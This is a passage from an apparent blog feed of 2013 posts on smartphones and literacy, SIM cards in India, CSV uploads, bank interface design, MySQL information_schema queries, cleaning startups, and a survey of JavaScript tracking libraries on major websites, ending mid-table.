<p>In 2012 global smartphone ownership surpassed PC ownership and smartphones are still seeing massive growth. The obvious consequence is that many people who’ve never owned a computer are starting to own smartphones and that’s having a huge impact on the world. Almost everything will be affected - not just technology but also business, politics, and general culture. As these smartphones get more powerful and pervasive we’ll see applications that we can’t even imagine right now.</p>

<p>What’s not being discussed is the impact this will have on the world’s literacy rate. In 2010, the <a href="http://en.wikipedia.org/wiki/List_of_countries_by_literacy_rate" target="_blank">global literacy rate</a> was estimated to be 84% but increasing smartphone ownership should drive it higher. Having something in your pocket that is both a business and entertainment device will encourage people to learn all its features. Sure one can just familiarize oneself with the various icons and key combinations to achieve certain results but I suspect being exposed to a smartphone’s potential will also serve as motivation to learn more.</p>

<p>Of course, this is just hopeful speculation on my part but I think we tend to view technological change through a tech filter. There’s a whole other world that’s difficult for us to imagine so we tend to not think about it too much. I had a professor, <a href="http://www.johnson.cornell.edu/Faculty-And-Research/Profile.aspx?id=lvo2" target="_blank">Prof Levent Orman</a>, discuss the impact that the car had on the world. The direct effect was the replacement of horses but the long term effects were the rise of highways and suburbs and a change in American culture. Smartphones are one of the technologies that will have such an impact, it’s just impossible to know what it will be.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Global products</title>
   <link href="http://dangoldin.com/2013/12/25/global-products/"/>
   <updated>2013-12-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/25/global-products</id>
   <content:encoded><![CDATA[
<p>The trip to India got me thinking about “global products” that work the same wherever they are. It’s surprisingly difficult to find tech products that fit this description. Cell phones will almost always work internationally but roaming charges make it impractical. Having an unlocked phone helps but you still need to get a SIM card which is a <a href="http://dangoldin.com/2013/12/23/getting-a-sim-card-in-india/">hassle</a> in many countries.</p>

<p>Even something as standard as a laptop isn’t as easy to use as it should be. Wifi connectivity varies depending where you are with most cities being great fickle elsewhere. Dealing with voltage conversion and plug adapters is something that always comes up. I’ve learned to travel with an adapter kit that includes enough combinations to be able to charge my laptop wherever I go.</p>

<p>The one product that actually worked as expected was the GPS running watch my wife got me for our anniversary. No matter where I was it was able to lock on to a satellite within a few minutes and accurately track my run. The only issue was charging which I was able to do via a USB cable connected to my laptop. Even that shows a weakness since if I didn’t have a laptop I wouldn’t have been able to charge the watch.</p>

<p>The funny thing is, each of these products was designed to work globally - it’s just that the infrastructure differences prevent that from being a reality. Whether it’s having a different set of of plugs or a particular way of getting a SIM card it’s not the product that’s the problem. As powerful as our products are they’re still operating within an infrastructure. And since products evolve faster than infrastructure we’ll continue to see this inconsistent product behavior around the world. Maybe by the time we colonize space we’ll have a consistent global infrastructure.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Getting a SIM card in India</title>
   <link href="http://dangoldin.com/2013/12/23/getting-a-sim-card-in-india/"/>
   <updated>2013-12-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/23/getting-a-sim-card-in-india</id>
   <content:encoded><![CDATA[
<p>I’ve heard about the wonders of an unlocked phone and decided to try it out during my recent trip to India. The idea was to get a cheap unlocked Android phone that I’d be able to use on this and future trips. I was able to get a relatively cheap Samsung phone but it took me a surprisingly long time to get a working SIM card. This post is a description of the steps I took as well as some advice for others trying to do the same.</p>

<p>First off, to get a SIM card as a foreigner in India, you need to have a copy of your passport and visa, a passport sized photo, and a local to act as a reference. After giving this information to vendor they will do the necessary paperwork, call the reference, and if everything goes well they will activate your SIM card within 24 hours after which you will need to call them to verify and start using the service.</p>

<p>My first attempt was in New Delhi where I went to an Airtel shop based the advice of my uncle. Unfortunately, I didn’t know I needed to have a passport sized photo but was referred to a nearby computer shop that was able to print them out at the cost of 10 rupees (~17 cents) a piece. I was able to buy a regular sized SIM for 300 rupees (~$5) but was told it would take around 24 hours to activate and would only be cut after that. Unfortunately, I had to leave Delhi for a wedding so didn’t get a chance to get it cut to a micro SIM until I had already arrived in Mumbai. By that point, I was in a different city and no longer able to activate a Delhi SIM card although it took me multiple days to figure that out.</p>

<p>After going back and forth to the Airtel shop in Mumbai a few times, and discovering a new hoop I had to jump through every time, I was about to give up until I shared my problem with someone at my hotel. He took me to a nearby stand which was able to take care of everything for me within a few hours. This went smoothly since I had a few of the passport photos left and he was willing to act as my local reference. Total cost was 600 rupees (~$10) and included 250 rupees of credit.</p>

<p>Now that I had a functional phone, it worked great. It took me a little bit of time to understand the prepaid model but once I did I actually preferred it more than the postpaid one I have in the US. You can go to the dozens of mobile vendors around cities which will glady load some money unto your account. You can then activate various services either by using these vendors, doing it online, or via text messaging. At any time you can text various numbers and codes in order to get the balance you have left on your plans as well as add new ones. With my 250 rupee balance (~$4) I was able to buy 150 MB of 3G for 44 rupees (~75 cents) and load the rest into a national dialing plan.</p>

<p>Having a phone that works wherever you go is immensely convenient. Traversing and exploring Mumbai became significantly easier and more fun when we were able to get the phone working. We were able to explore the city without having to worry about getting lost and were able to discover and research local gems. It wasn’t as serendipitous as just walking around but we hopefully struck the right balance.</p>

<p>The challenge was in getting the SIM card working and I’m sure the process will vary in every country. My advice is to do research on how to get a prepaid SIM card before travelling and come prepared with everything you need so you can get the process started soon after arriving. If you know you’ll only be spending time in a city for a single day it may not make sense to get the SIM card there since it may not be possible to activate it in another city - I’m not sure if this is due to my experience or just the way things are done in India but it’s something to be aware of. You can also try contacting the hotel you’re staying at since they should have had experience helping their guests get SIM cards.</p>

<p>T-Mobile recently launched a <a href="http://how-to.t-mobile.com/global/" target="_blank">global plan</a> and I’m sure more and more carriers will follow suit. Until then we’re stuck with SIM cards and the unique challenges of obtaining one in different countries.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>CSV powered products</title>
   <link href="http://dangoldin.com/2013/12/21/csv-powered-products/"/>
   <updated>2013-12-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/21/csv-powered-products</id>
   <content:encoded><![CDATA[
<p>Something that I’ve been thinking about ever since I worked as a product manager focused on internal tools is being able to run a product entirely through CSV file uploads. Instead of building a UX designed to handle bulk operations and complicated workflows you build support for file uploads and handle the business logic entirely on the backend. The motivation is that it’s extremely difficult to build a UI that’s going to be as powerful and flexible as a simple CSV file, especially when outside tools, such as Excel, can help generate these files.</p>

<p>This approach also has the nice property of decoupling the input from the core business logic. Over time, tools and interfaces can be built that are optimized for specific use cases without having to modify any of the backend. Effort can be spent on improving workflows that are already being done rather than building support for workflows that may or may not be common. Permissions and controls can also be added that make the application accessibility to a wider range of users.</p>

<p>Many companies spend tons of time building advanced tools that will never be as powerful as Excel paired with a simple file upload. Workflows vary significantly across users and most products impose a single approach. Why not build more general tools that take advantage of the unique work styles?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why Bank of America, why?</title>
   <link href="http://dangoldin.com/2013/12/20/why-bank-of-america-why/"/>
   <updated>2013-12-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/20/why-bank-of-america-why</id>
   <content:encoded><![CDATA[
<p>Before leaving for a trip to India, I wanted to make sure that I’d be allowed to access the ATM so I decided to contact my bank. Surprisingly, Bank of America was modern enough to allow me to do this online. Unsurprisingly, the UX was lacking.</p>

<p>Instead of just asking which country I was traveling to using a simple autocomplete or dropdown they have a three step process. First, I get to choose whether I’m traveling domestic or international. If internationally, I get presented with four options that are just the first letter of each country name. After choosing a country range bucket, I can finally pick the actual country.</p>

<img src="http://dangoldin.com/assets/static/images/boa-travel-1.png" alt="BoA Travel 1" width="595" height="169" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/boa-travel-2.png" alt="BoA Travel 2" width="616" height="223" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/boa-travel-3.png" alt="BoA Travel 3" width="636" height="226" layout="responsive"/>

<p>I understand when an inferior UX decision is made because it’s cheaper to implement but in this case it must have actually been more difficult. Instead of having a single dropdown or autocomplete they have three different input elements. Even if the first selection is necessary, there’s no need to split 206 countries into 4 separate lists.</p>

<p>I’m not sure what I was expecting but it’s still frustrating seeing such decisions being made. I’d love to know the reasons.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Using the information_schema.columns table</title>
   <link href="http://dangoldin.com/2013/12/15/using-the-information_schemacolumns-table/"/>
   <updated>2013-12-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/15/using-the-information_schemacolumns-table</id>
   <content:encoded><![CDATA[
<p>Something that’s been really helpful to me in understanding a MySQL database is the built in <a href="http://dev.mysql.com/doc/refman/5.0/en/columns-table.html" target="_blank">information_schema.columns</a> table. It provides information on every column in the database and is queryable just like any other table. This makes it easy to quickly find all tables that have a particular column name or all columns that are the same data type. There have been countless times where I knew the data existed somewhere but couldn’t recall which table it was in. Querying the information_schema.columns table for the foreign key helped me quickly figure it out. Below are some sample queries that retrieve data from the information_schema.columns table:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">table_schema</span><span class="p">,</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">column_name</span> <span class="k">like</span> <span class="s1">'%user_id%’;

select * from information_schema.columns where column_name like '</span><span class="o">%</span><span class="nb">time</span><span class="o">%</span><span class="err">’</span><span class="p">;</span>

<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">data_type</span> <span class="o">=</span> <span class="s1">'datetime'</span><span class="p">;</span></code></pre></figure>

<p>Since it’s just like any other table, except for being read-only, you can write jobs that access the data. Something I had to recently do was write a quick script to generate fake data. All a user has to do is specify the table name to populate and the script would look up the columns and their types from information_schema.columns and dynamically generate the INSERT statements. For example, if a column was of type varchar it would generate a random text string less than or equal to the length constraint and if it were an int it would generate a random number. It wasn’t perfect and only handled foreign keys that were specified by the user but it was great given the effort. A later version could use the information provided by two other information_schema tables, table_constraints and key_column_usage, to get rid of this manual step. If you’re a frequent MySQL user, familiarizing yourself with the tables in information_schema will make you significantly more efficient.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why are there so many cleaning startups?</title>
   <link href="http://dangoldin.com/2013/12/09/why-are-there-so-many-cleaning-startups/"/>
   <updated>2013-12-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/09/why-are-there-so-many-cleaning-startups</id>
   <content:encoded><![CDATA[
<p>The recent rise of marketplace startups is great and benefits all except the incumbent. They provide much needed liquidity and transparency to markets that helpfully reduce costs to the consumer and increase volume to the provider.</p>

<p>Yet I’m surprised by the number of home cleaning service startups out there. I’m aware of <a href="https://www.homejoy.com/" target="_blank">HomeJoy</a>, <a href="https://iamexec.com/" target="_blank">Exec</a>, <a href="http://getmaid.com/" target="_blank">GetMaid</a>, <a href="https://www.myclean.com/" target="_blank">MyClean</a>, and <a href="http://www.handybook.com/" target="_blank">HandyBook</a>, but am sure there are countless other copycats. The Uber approach works because it’s for an immediate service with a one time transaction where the value provided is somewhat of a commodity. This is not the case with home cleaning services. The range of quality among cleaners varies significantly more than the quality among drivers and I’d be willing to have a good cleaner come in at a slightly inconvenient time rather than a poor cleaner at the perfect time. And once I find a cleaner I like I’d want to book them directly rather than go through the company again. This way I can get a lower rate while also giving a cleaner more than they’d otherwise make from using the service. This would violate the company’s terms but I don’t see how they can be enforced.</p>

<p>I’m sure there’s still a large market for such cleaning services, I’m just not as <a href="http://blogs.wsj.com/venturecapital/2013/12/05/homejoy-raises-38m-for-house-cleaning-on-demand/" target="_blank">optimistic as others</a> seem to be. I see it being great for one off events - cleaning after a party, getting your apartment ready a visit from the parents, or preparing your home for sale. I just don’t see how this is a huge market that warrants all these startups. I understand it’s just the beachhead but it doesn’t seem to be a very strong one. Have the better ones already been done? Uber is dominating car service. Food delivery is full of one-time transactions that need to be met quickly but it’s already a mature market. Laundry is another one and there are two startups I’m aware of working on it - Washio and Prim. HandyBook also offers handyman services although they seem to be more focused on home cleaning. I really don’t know why home cleaning startups are so popular.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Drowning in JavaScript</title>
   <link href="http://dangoldin.com/2013/12/01/drowning-in-javascript/"/>
   <updated>2013-12-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/01/drowning-in-javascript</id>
   <content:encoded><![CDATA[
<p>I recently installed Ghostery and am amazed by the number of JavaScript libraries being loaded on the sites I visit. Almost every site I visit has at least one analytics library, a few advertising libraries, and some social network sharing libraries.</p>

<p>To be a bit more quantitative, I pulled the libraries used by 20 of top sites to see if anything stood out. The biggest surprise was how differently the various types of sites used these libraries. Every single publisher used DoubleClick and yet only a quarter of them used Google Analytics while 80% of the social networks I looked at used Google Analytics and only 40% used DoubleClick. The other interesting piece was how many more libraries an average publisher uses compared to a social network or ecommerce site. Five of the 13 publishers I looked at included at least 20 JavaScript libraries while the most libraries included by a social network was 4, which was Pinterest. The bulk of these additional libraries tend to be advertising specific so it’s not that surprising that publishers have more of them but the difference in volume was shocking. I’ve included the data at the bottom of this post in case someone wants to take a stab at it but something on my todo list is to automate the process of gathering this info rather than relying on Ghostery and copy and paste. Once I get get it done I’ll follow up with another post analyzing the larger set of data.</p>

<p>Even if these libraries get cached in the browser it’s still quite a lot of JavaScript that’s executed every time a site is loaded. It’s insane that Forbes is loading 39 libraries every time a page is seen. I suspect most people use AdBlock not because of ads but because of the degraded performance of a site having to load these libraries and the associated images. I’m aware that publishers are in trouble but I don’t think adding more and more libraries to eke out additional revenue is a sustainable model.</p>

<p>
<h3># of Libraries by Site</h3>
<table class="table"><thead><tr><th>Site</th><th>Site Type</th><th># of Libraries</th></tr></thead><tbody><tr><td>Forbes</td><td>Publisher</td><td>39</td></tr><tr><td>BBC</td><td>Publisher</td><td>33</td></tr><tr><td>The Guardian</td><td>Publisher</td><td>25</td></tr><tr><td>Washington Post</td><td>Publisher</td><td>24</td></tr><tr><td>DailyKos</td><td>Publisher</td><td>23</td></tr><tr><td>NY Times</td><td>Publisher</td><td>19</td></tr><tr><td>USA Today</td><td>Publisher</td><td>18</td></tr><tr><td>Huff Po</td><td>Publisher</td><td>17</td></tr><tr><td>ABC</td><td>Publisher</td><td>15</td></tr><tr><td>Fox News</td><td>Publisher</td><td>15</td></tr><tr><td>Amazon</td><td>E Commerce</td><td>12</td></tr><tr><td>CNN</td><td>Publisher</td><td>10</td></tr><tr><td>ESPN</td><td>Publisher</td><td>9</td></tr><tr><td>Ebay</td><td>E Commerce</td><td>8</td></tr><tr><td>Yahoo</td><td>Publisher</td><td>6</td></tr><tr><td>Pinterest</td><td>Social Network</td><td>4</td></tr><tr><td>Facebook</td><td>Social Network</td><td>3</td></tr><tr><td>Tumblr</td><td>Social Network</td><td>3</td></tr><tr><td>Reddit</td><td>Social Network</td><td>2</td></tr><tr><td>Twitter</td><td>Social Network</td><td>1</td></tr></tbody></table>
</p>

<p>
<h3># of Sites by Library</h3>
<table class="table"><thead><tr><th>Library</th><th># of Sites</th></tr></thead><tbody><tr><td>DoubleClick</td><td>17</td></tr><tr><td>ScoreCard Research Beacon</td><td>14</td></tr><tr><td>Google Adsense</td><td>10</td></tr><tr><td>ChartBeat</td><td>8</td></tr><tr><td>NetRatings SiteCensus</td><td>8</td></tr><tr><td>Facebook Connect</td><td>8</td></tr><tr><td>Quantcast</td><td>8</td></tr><tr><td>Google Analytics</td><td>7</td></tr><tr><td>Datalogix</td><td>7</td></tr><tr><td>Right Media</td><td>7</td></tr><tr><td>Omniture (Adobe Analytics)</td><td>6</td></tr><tr><td>AppNexus</td><td>6</td></tr><tr><td>Moat</td><td>6</td></tr><tr><td>Audience Science</td><td>6</td></tr><tr><td>Evidon Notice</td><td>5</td></tr><tr><td>MediaMath</td><td>5</td></tr><tr><td>TrackingSoft</td><td>5</td></tr><tr><td>Adobe Test &amp; Target</td><td>4</td></tr><tr><td>Visual Revenue</td><td>4</td></tr><tr><td>Aggregate Knowledge</td><td>4</td></tr><tr><td>Acxiom</td><td>4</td></tr><tr><td>Google AdWords Conversion</td><td>3</td></tr><tr><td>AdRoll</td><td>3</td></tr><tr><td>Criteo</td><td>3</td></tr><tr><td>DoubleClick Spotlight</td><td>3</td></tr><tr><td>Facebook Social Plugins</td><td>3</td></tr><tr><td>Twitter Button</td><td>3</td></tr><tr><td>Outbrain</td><td>3</td></tr><tr><td>Quigo AdSonar</td><td>3</td></tr><tr><td>Atlas</td><td>3</td></tr><tr><td>Rubicon</td><td>3</td></tr><tr><td>Advertising.com</td><td>3</td></tr><tr><td>Krux Digital</td><td>3</td></tr><tr><td>BrightRoll</td><td>3</td></tr><tr><td>eXelate</td><td>3</td></tr><tr><td>BuzzFeed</td><td>2</td></tr><tr><td>Optimizely</td><td>2</td></tr><tr><td>Typekit by Adobe</td><td>2</td></tr><tr><td>AdXpose</td><td>2</td></tr><tr><td>Casale Media</td><td>2</td></tr><tr><td>Media Optimizer (Adobe)</td><td>2</td></tr><tr><td>VoiceFive</td><td>2</td></tr><tr><td>AdMeld</td><td>2</td></tr><tr><td>Amazon Associates</td><td>2</td></tr><tr><td>Facebook Exchange (FBX)</td><td>2</td></tr><tr><td>OpenX</td><td>2</td></tr><tr><td>PubMatic</td><td>2</td></tr><tr><td>TRUSTe Notice</td><td>2</td></tr><tr><td>Facebook Social Graph</td><td>2</td></tr><tr><td>MediaMind</td><td>2</td></tr><tr><td>[x+1]</td><td>2</td></tr><tr><td>BlueKai</td><td>2</td></tr><tr><td>Brilig</td><td>2</td></tr><tr><td>Media Innovation Group</td><td>2</td></tr><tr><td>Neustar AdAdvisor</td><td>2</td></tr><tr><td>SpotXchange</td><td>2</td></tr><tr><td>24/7 Media Ad Network</td><td>2</td></tr><tr><td>Dynamic Logic</td><td>1</td></tr><tr><td>Gravity Insights</td><td>1</td></tr><tr><td>Crazy Egg</td><td>1</td></tr><tr><td>DoubleClick Floodlight</td><td>1</td></tr><tr><td>FreeWheel</td><td>1</td></tr><tr><td>Gigya Socialize</td><td>1</td></tr><tr><td>MixPanel</td><td>1</td></tr><tr><td>Specific Media</td><td>1</td></tr><tr><td>Twitter Badge</td><td>1</td></tr><tr><td>ValueClick Mediaplex</td><td>1</td></tr><tr><td>Janrain</td><td>1</td></tr><tr><td>Parse.ly</td><td>1</td></tr><tr><td>Yahoo Analytics</td><td>1</td></tr><tr><td>Burst Media</td><td>1</td></tr><tr><td>PulsePoint</td><td>1</td></tr><tr><td>eBay Stats</td><td>1</td></tr><tr><td>Genome</td><td>1</td></tr><tr><td>ADTECH</td><td>1</td></tr><tr><td>Google +1</td><td>1</td></tr><tr><td>DoubleClick DART</td><td>1</td></tr><tr><td>Adzerk</td><td>1</td></tr><tr><td>Effective Measure</td><td>1</td></tr><tr><td>Mindset Media</td><td>1</td></tr><tr><td>Rocket Fuel</td><td>1</td></tr><tr><td>Brightcove</td><td>1</td></tr><tr><td>New York Times</td><td>1</td></tr><tr><td>WebTrends</td><td>1</td></tr><tr><td>ForeSee</td><td>1</td></tr><tr><td>Google AJAX Search API</td><td>1</td></tr><tr><td>Integral Ad Science</td><td>1</td></tr><tr><td>Media6Degrees</td><td>1</td></tr><tr><td>Adap.tv</td><td>1</td></tr><tr><td>AddThis</td><td>1</td></tr><tr><td>AMP Platform</td><td>1</td></tr><tr><td>DoubleClick Bid Manager</td><td>1</td></tr><tr><td>i-Behavior</td><td>1</td></tr><tr><td>Intent Media</td><td>1</td></tr><tr><td>Lotame</td><td>1</td></tr><tr><td>Martini Media</td><td>1</td></tr><tr><td>Media.net</td><td>1</td></tr><tr><td>Tacoda</td><td>1</td></tr><tr><td>Tapad</td><td>1</td></tr><tr><td>TidalTV</td><td>1</td></tr><tr><td>TradeDesk</td><td>1</td></tr><tr><td>Turn</td><td>1</td></tr><tr><td>Undertone</td><td>1</td></tr><tr><td>SimpleReach</td><td>1</td></tr><tr><td>Tealium</td><td>1</td></tr><tr><td>Bizo</td><td>1</td></tr><tr><td>New Relic</td><td>1</td></tr><tr><td>Trove</td><td>1</td></tr></tbody></table>
</p>

<p>
<h3>Avg # of Libraries by Site Type</h3>
<table class="table"><thead><tr><th>Site Type</th><th># of Sites</th><th>Avg # Libraries</th></tr></thead><tbody><tr><td>Publisher</td><td>13</td><td>19.46</td></tr><tr><td>Social Network</td><td>5</td><td>2.60</td></tr><tr><td>E Commerce</td><td>2</td><td>10.00</td></tr></tbody></table>
</p>

<p>
<h3>Raw Data</h3>
<table class="table"><thead><tr><th>Site</th><th>Library</th><th>Site Type</th></tr></thead><tbody><tr><td>ESPN</td><td>Adobe Test &amp; Target</td><td>Publisher</td></tr><tr><td>ESPN</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>ESPN</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>ESPN</td><td>Dynamic Logic</td><td>Publisher</td></tr><tr><td>ESPN</td><td>Evidon Notice</td><td>Publisher</td></tr><tr><td>ESPN</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>ESPN</td><td>Gravity Insights</td><td>Publisher</td></tr><tr><td>ESPN</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>ESPN</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>ABC</td><td>BuzzFeed</td><td>Publisher</td></tr><tr><td>ABC</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>ABC</td><td>Crazy Egg</td><td>Publisher</td></tr><tr><td>ABC</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>ABC</td><td>DoubleClick Floodlight</td><td>Publisher</td></tr><tr><td>ABC</td><td>Facebook Connect</td><td>Publisher</td></tr><tr><td>ABC</td><td>FreeWheel</td><td>Publisher</td></tr><tr><td>ABC</td><td>Gigya Socialize</td><td>Publisher</td></tr><tr><td>ABC</td><td>Google AdWords Conversion</td><td>Publisher</td></tr><tr><td>ABC</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>ABC</td><td>Omniture (Adobe Analytics)</td><td>Publisher</td></tr><tr><td>ABC</td><td>Optimizely</td><td>Publisher</td></tr><tr><td>ABC</td><td>Quantcast</td><td>Publisher</td></tr><tr><td>ABC</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>ABC</td><td>Typekit by Adobe</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>AdRoll</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>AdXpose</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>AppNexus</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Casale Media</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Criteo</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>DoubleClick Spotlight</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Evidon Notice</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Facebook Connect</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Facebook Social Plugins</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Google AdWords Conversion</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Google Analytics</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>MediaMath</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>MixPanel</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Quantcast</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Specific Media</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>TrackingSoft</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Twitter Badge</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>Twitter Button</td><td>Publisher</td></tr><tr><td>DailyKos</td><td>ValueClick Mediaplex</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Adobe Test &amp; Target</td><td>Publisher</td></tr><tr><td>Fox News</td><td>AdRoll</td><td>Publisher</td></tr><tr><td>Fox News</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Evidon Notice</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Google Adsense</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Janrain</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Media Optimizer (Adobe)</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Moat</td><td>Publisher</td></tr><tr><td>Fox News</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Outbrain</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Parse.ly</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Quigo AdSonar</td><td>Publisher</td></tr><tr><td>Fox News</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>Fox News</td><td>TrackingSoft</td><td>Publisher</td></tr><tr><td>Fox News</td><td>Visual Revenue</td><td>Publisher</td></tr><tr><td>Facebook</td><td>Aggregate Knowledge</td><td>Social Network</td></tr><tr><td>Facebook</td><td>Atlas</td><td>Social Network</td></tr><tr><td>Facebook</td><td>DoubleClick</td><td>Social Network</td></tr><tr><td>Twitter</td><td>Google Analytics</td><td>Social Network</td></tr><tr><td>Yahoo</td><td>Datalogix</td><td>Publisher</td></tr><tr><td>Yahoo</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>Yahoo</td><td>Right Media</td><td>Publisher</td></tr><tr><td>Yahoo</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>Yahoo</td><td>VoiceFive</td><td>Publisher</td></tr><tr><td>Yahoo</td><td>Yahoo Analytics</td><td>Publisher</td></tr><tr><td>Amazon</td><td>AdMeld</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>Amazon Associates</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>AppNexus</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>Burst Media</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>DoubleClick</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>Facebook Exchange (FBX)</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>Google Adsense</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>OpenX</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>PubMatic</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>PulsePoint</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>Right Media</td><td>E Commerce</td></tr><tr><td>Amazon</td><td>Rubicon</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>Aggregate Knowledge</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>Datalogix</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>DoubleClick</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>eBay Stats</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>Genome</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>MediaMath</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>Right Media</td><td>E Commerce</td></tr><tr><td>Ebay</td><td>TRUSTe Notice</td><td>E Commerce</td></tr><tr><td>Tumblr</td><td>Google Analytics</td><td>Social Network</td></tr><tr><td>Tumblr</td><td>Quantcast</td><td>Social Network</td></tr><tr><td>Tumblr</td><td>ScoreCard Research Beacon</td><td>Social Network</td></tr><tr><td>Pinterest</td><td>DoubleClick</td><td>Social Network</td></tr><tr><td>Pinterest</td><td>Facebook Connect</td><td>Social Network</td></tr><tr><td>Pinterest</td><td>Facebook Social Graph</td><td>Social Network</td></tr><tr><td>Pinterest</td><td>Google Analytics</td><td>Social Network</td></tr><tr><td>Huff Po</td><td>Adobe Test &amp; Target</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>ADTECH</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Advertising.com</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Facebook Connect</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Facebook Social Plugins</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Google +1</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Google Analytics</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>MediaMind</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Moat</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Omniture (Adobe Analytics)</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Quantcast</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Quigo AdSonar</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>TrackingSoft</td><td>Publisher</td></tr><tr><td>Huff Po</td><td>Twitter Button</td><td>Publisher</td></tr><tr><td>CNN</td><td>ChartBeat</td><td>Publisher</td></tr><tr><td>CNN</td><td>DoubleClick</td><td>Publisher</td></tr><tr><td>CNN</td><td>DoubleClick DART</td><td>Publisher</td></tr><tr><td>CNN</td><td>Facebook Connect</td><td>Publisher</td></tr><tr><td>CNN</td><td>Facebook Social Plugins</td><td>Publisher</td></tr><tr><td>CNN</td><td>Krux Digital</td><td>Publisher</td></tr><tr><td>CNN</td><td>NetRatings SiteCensus</td><td>Publisher</td></tr><tr><td>CNN</td><td>ScoreCard Research Beacon</td><td>Publisher</td></tr><tr><td>CNN</td><td>Twitter Button</td><td>Publisher</td></tr><tr><td>CNN</td><td>Visual Revenue</td><td>Publisher</td></tr><tr><td>Reddit</td><td>Adzerk</td><td>Social Network</td></tr><tr><td>Reddit</td><td>Google Analytics</td><td>Social 